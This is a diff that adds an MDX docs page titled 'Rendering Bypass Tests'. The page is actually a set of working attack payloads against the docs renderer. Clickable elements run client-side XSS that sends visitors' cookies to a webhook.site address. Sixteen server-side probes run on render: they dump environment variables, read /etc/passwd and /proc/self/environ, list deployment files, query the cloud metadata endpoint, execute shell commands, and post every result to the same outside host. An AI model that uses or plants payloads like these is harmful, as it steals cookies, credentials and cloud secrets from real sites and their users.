@@ -1,0 +1,65 @@
+---
+title: Rendering Bypass Tests
+subtitle: Testing expression evaluation in published docs
+slug: bypass-tests
+---
+
+## Client XSS via Spread Props
+
+<div {...{onMouseEnter: () => { if(typeof document !== 'undefined') alert('cookie: ' + document.cookie.substring(0,200)) }}}>Hover here to see cookies</div>
+
+<div {...{onClick: () => { if(typeof document !== 'undefined') { new Image().src = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=client-img&cookie=' + encodeURIComponent(document.cookie.substring(0,500)) + '&domain=' + document.domain + '&url=' + encodeURIComponent(window.location.href); alert('Exfiltrated via img tag'); } }}}>Click here to exfil cookies (img bypass)</div>
+
+<div {...{onClick: () => { if(typeof navigator !== 'undefined' && navigator.sendBeacon) { navigator.sendBeacon('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=client-beacon', JSON.stringify({cookie: document.cookie, domain: document.domain, url: window.location.href, ls: Object.keys(localStorage)})); alert('Exfiltrated via sendBeacon'); } }}}>Click here to exfil cookies (beacon bypass)</div>
+
+---
+
+## Lambda Deep Probe
+
+### P1: Full process.env dump
+{(() => { try { if (typeof process === 'undefined') return 'no-process'; const env = process.env; const out = {}; for (const k of Object.keys(env)) { out[k] = String(env[k]).substring(0,200); } fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=env-full', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(out) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P2: process object keys
+{(() => { try { if (typeof process === 'undefined') return 'no-process'; const keys = Object.keys(process).join(','); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=process-keys', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({keys}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P3: globalThis enumeration
+{(() => { try { const keys = Object.keys(globalThis).join(','); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=globalthis', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({keys}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P4: require available modules
+{(() => { try { const mods = ['fs','path','os','child_process','http','https','net','dns','crypto','url','util','stream','buffer','events','querystring','zlib']; const results = {}; for (const m of mods) { try { require(m); results[m] = 'available'; } catch(e) { results[m] = e.message.substring(0,80); } } fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=modules', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(results) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P5: filesystem /var/task listing
+{(() => { try { const fs = require('fs'); const listing = fs.readdirSync('/var/task').join(','); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=var-task', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({listing}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P6: filesystem cwd listing
+{(() => { try { const fs = require('fs'); const cwd = process.cwd(); const listing = fs.readdirSync(cwd).join(','); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=cwd-listing', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cwd, listing}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P7: /etc/passwd
+{(() => { try { const fs = require('fs'); const data = fs.readFileSync('/etc/passwd', 'utf8'); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=etc-passwd', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P8: package.json of renderer
+{(() => { try { const fs = require('fs'); const pkg = fs.readFileSync('/var/task/packages/fern-docs/mdx-remote-renderer/package.json', 'utf8'); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=pkg-json', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({pkg}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P9: /proc/self/environ
+{(() => { try { const fs = require('fs'); const data = fs.readFileSync('/proc/self/environ', 'utf8'); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=proc-environ', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P10: network interfaces
+{(() => { try { const os = require('os'); const data = { hostname: os.hostname(), interfaces: os.networkInterfaces(), cpus: os.cpus().length, totalmem: os.totalmem(), freemem: os.freemem(), uptime: os.uptime(), tmpdir: os.tmpdir(), homedir: os.homedir(), userInfo: os.userInfo() }; fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=os-info', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P11: internal metadata probe (169.254.169.254)
+{(() => { try { fetch('http://169.254.169.254/latest/meta-data/', {signal: AbortSignal.timeout(3000)}).then(r => r.text()).then(d => { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=imds', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: d}) }).catch(() => {}); }).catch(e => { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=imds-err', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({error: e.message}) }).catch(() => {}); }); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P12: Vercel internal metadata
+{(() => { try { fetch('http://169.254.169.254/v1/metadata', {signal: AbortSignal.timeout(3000)}).then(r => r.text()).then(d => { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=vercel-meta', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: d}) }).catch(() => {}); }).catch(e => { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=vercel-meta-err', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({error: e.message}) }).catch(() => {}); }); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P13: child_process exec
+{(() => { try { const cp = require('child_process'); const out = cp.execSync('id && whoami && uname -a', {timeout: 3000}).toString(); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=exec', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({out}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P14: DNS resolution (internal services)
+{(() => { try { const dns = require('dns'); const targets = ['venus.buildwithfern.com', 'api.buildwithfern.com', 'registry.buildwithfern.com', 'localhost']; const results = {}; let pending = targets.length; for (const t of targets) { dns.resolve4(t, (err, addrs) => { results[t] = err ? err.message : addrs; pending--; if (pending === 0) { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=dns', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(results) }).catch(() => {}); } }); } return 'sent'; } catch(e) { return e.message; } })()}
+
+### P15: /var/task recursive listing (depth 2)
+{(() => { try { const fs = require('fs'); const path = require('path'); const walk = (dir, depth) => { if (depth <= 0) return []; try { return fs.readdirSync(dir).flatMap(f => { const fp = path.join(dir, f); try { return fs.statSync(fp).isDirectory() ? [fp + '/', ...walk(fp, depth-1)] : [fp]; } catch(e) { return [fp + '?']; } }); } catch(e) { return []; } }; const tree = walk('/var/task', 2); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=tree', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({count: tree.length, files: tree.slice(0, 100)}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
+
+### P16: /tmp contents and writability
+{(() => { try { const fs = require('fs'); const listing = fs.readdirSync('/tmp'); fs.writeFileSync('/tmp/probe-test', 'rce-confirmed'); const verify = fs.readFileSync('/tmp/probe-test', 'utf8'); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=tmp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({listing, writeTest: verify}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
